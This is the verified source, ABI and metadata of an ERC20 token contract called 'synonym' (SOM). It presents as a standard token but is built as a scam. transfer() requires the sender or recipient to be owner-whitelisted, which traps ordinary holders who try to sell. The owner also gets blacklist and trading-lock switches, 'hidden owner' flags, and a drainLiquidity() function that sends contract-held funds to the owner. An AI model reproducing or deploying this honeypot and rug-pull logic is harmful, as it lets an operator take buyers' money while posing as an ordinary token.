{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract ERC20Token {\r\n    string public name = \"synonym\";\r\n    string public symbol = \"SOM\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply =1000000000000000000000000;\r\n\r\n    address public owner;\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    mapping(address => bool) public isSaleLocked;\r\n    mapping(address => bool) public isHiddenOwner;\r\n    bool public liquidityDrainEnabled;\r\n    uint256 public liquidityAmount;\r\n    mapping(address => bool) public isBlacklisted;\r\n    mapping(address => bool) public isWhitelisted;\r\n    bool public antiBotEnabled;\r\n    bool public tradingLocked;\r\n\r\n    uint256 private constant _MAX_INT = 2**256 - 1;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event SaleLocked(address indexed account, bool locked);\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event HiddenOwnership(address indexed owner, bool hidden);\r\n    event LiquidityDrained(uint256 amount);\r\n    event Blacklisted(address indexed account, bool blacklisted);\r\n    event Whitelisted(address indexed account, bool whitelisted);\r\n    event AntiBotEnabled(bool enabled);\r\n    event TradingLocked(bool locked);\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"ERC20: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    modifier tradable() {\r\n        require(!tradingLocked, \"ERC20: trading is currently locked\");\r\n        _;\r\n    }\r\n\r\n    constructor(\r\n        string memory _name,\r\n        string memory _symbol,\r\n        uint8 _decimals,\r\n        uint256 _initialSupply\r\n    ) {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n        totalSupply = _initialSupply * 10 ** uint256(_decimals);\r\n        owner = msg.sender;\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n\r\n    function transfer(address _to, uint256 _value) external tradable returns (bool success) {\r\n        require(_to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(balanceOf[msg.sender] >= _value, \"ERC20: insufficient balance for transfer\");\r\n        require(!isSaleLocked[msg.sender], \"ERC20: sales are locked for this address\");\r\n        require(!isBlacklisted[_to], \"ERC20: transfer to blacklisted address is prohibited\");\r\n        require(isWhitelisted[msg.sender] || isWhitelisted[_to], \"ERC20: transfer between non-whitelisted addresses is prohibited\");\r\n        require(!antiBotEnabled || tx.origin == msg.sender, \"ERC20: frontrun protection is enabled\");\r\n\r\n        balanceOf[msg.sender] -= _value;\r\n        balanceOf[_to] += _value;\r\n        emit Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function lockSales() external {\r\n        isSaleLocked[msg.sender] = true;\r\n        emit SaleLocked(msg.sender, true);\r\n    }\r\n\r\n    function unlockSales() external {\r\n        isSaleLocked[msg.sender] = false;\r\n        emit SaleLocked(msg.sender, false);\r\n    }\r\n\r\n    function transferOwnership(address _newOwner) external onlyOwner {\r\n        require(_newOwner != address(0), \"ERC20: new owner is the zero address\");\r\n        emit OwnershipTransferred(owner, _newOwner);\r\n        owner = _newOwner;\r\n    }\r\n\r\n    function setHiddenOwnership(address _address, bool _hidden) external onlyOwner {\r\n        isHiddenOwner[_address] = _hidden;\r\n        emit HiddenOwnership(_address, _hidden);\r\n    }\r\n\r\n    function enableLiquidityDrain() external onlyOwner {\r\n        liquidityDrainEnabled = true;\r\n    }\r\n\r\n    function disableLiquidityDrain() external onlyOwner {\r\n        liquidityDrainEnabled = false;\r\n    }\r\n\r\n    function drainLiquidity() external onlyOwner {\r\n        require(liquidityDrainEnabled, \"ERC20: liquidity drain is not enabled\");\r\n        // Transfer liquidity to the owner address\r\n        _transfer(address(this), owner, liquidityAmount);\r\n        emit LiquidityDrained(liquidityAmount);\r\n    }\r\n\r\n    function blacklistAddress(address _address, bool _isBlacklisted) external onlyOwner {\r\n        isBlacklisted[_address] = _isBlacklisted;\r\n        emit Blacklisted(_address, _isBlacklisted);\r\n    }\r\n\r\n    function whitelistAddress(address _address, bool _isWhitelisted) external onlyOwner {\r\n        isWhitelisted[_address] = _isWhitelisted;\r\n        emit Whitelisted(_address, _isWhitelisted);\r\n    }\r\n\r\n    function enableAntiBot() external onlyOwner {\r\n        antiBotEnabled = true;\r\n        emit AntiBotEnabled(true);\r\n    }\r\n\r\n    function disableAntiBot() external onlyOwner {\r\n        antiBotEnabled = false;\r\n        emit AntiBotEnabled(false);\r\n    }\r\n\r\n    function lockTrading() external onlyOwner {\r\n        tradingLocked = true;\r\n        emit TradingLocked(true);\r\n    }\r\n\r\n    function unlockTrading() external onlyOwner {\r\n        tradingLocked = false;\r\n        emit TradingLocked(false);\r\n    }\r\n\r\n    // Internal function to safely transfer tokens\r\n    function _transfer(address _from, address _to, uint256 _value) internal {\r\n        require(_to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(balanceOf[_from] >= _value, \"ERC20: insufficient balance for transfer\");\r\n        require(balanceOf[_to] + _value >= balanceOf[_to], \"ERC20: overflow detected\");\r\n\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        emit Transfer(_from, _to, _value);\r\n    }\r\n\r\n    // Internal function to handle approvals\r\n    function _approve(address _owner, address _spender, uint256 _value) internal {\r\n        require(_owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(_spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        allowance[_owner][_spender] = _value;\r\n        emit Approval(_owner, _spender, _value);\r\n    }\r\n\r\n    // Approve tokens\r\n    function approve(address _spender, uint256 _value) external returns (bool) {\r\n        _approve(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    // Transfer tokens from one address to another\r\n    function transferFrom(address _from, address _to, uint256 _value) external tradable returns (bool) {\r\n        uint256 currentAllowance = allowance[_from][msg.sender];\r\n        require(currentAllowance >= _value, \"ERC20: insufficient allowance for transfer\");\r\n        require(_from != address(0), \"ERC20: transfer from the zero address\");\r\n        \r\n        _transfer(_from, _to, _value);\r\n        _approve(_from, msg.sender, currentAllowance - _value);\r\n        return true;\r\n    }\r\n\r\n    // Increase allowance\r\n    function increaseAllowance(address _spender, uint256 _addedValue) external returns (bool) {\r\n        _approve(msg.sender, _spender, allowance[msg.sender][_spender] + _addedValue);\r\n        return true;\r\n    }\r\n\r\n    // Decrease allowance\r\n    function decreaseAllowance(address _spender, uint256 _subtractedValue) external returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][_spender];\r\n        require(currentAllowance >= _subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        \r\n        _approve(msg.sender, _spender, currentAllowance - _subtractedValue);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"_decimals\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"_initialSupply\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"AntiBotEnabled\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"blacklisted\",\"type\":\"bool\"}],\"name\":\"Blacklisted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"hidden\",\"type\":\"bool\"}],\"name\":\"HiddenOwnership\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"LiquidityDrained\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"locked\",\"type\":\"bool\"}],\"name\":\"SaleLocked\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"locked\",\"type\":\"bool\"}],\"name\":\"TradingLocked\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"whitelisted\",\"type\":\"bool\"}],\"name\":\"Whitelisted\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"antiBotEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_isBlacklisted\",\"type\":\"bool\"}],\"name\":\"blacklistAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableAntiBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableLiquidityDrain\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"drainLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAntiBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidityDrain\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isHiddenOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSaleLocked\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isWhitelisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityDrainEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lockSales\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lockTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_hidden\",\"type\":\"bool\"}],\"name\":\"setHiddenOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLocked\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"unlockSales\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"unlockTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_isWhitelisted\",\"type\":\"bool\"}],\"name\":\"whitelistAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ERC20Token", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000d3c21bcecceda1000000000000000000000000000000000000000000000000000000000000000000002a307839353937376130343530313362463562323639383763364362383734333233653032463035434234000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003534f4d0000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://9b2152f034961943eaabd82637e1594e964a101092a82273eca6789ae3b66fcb"}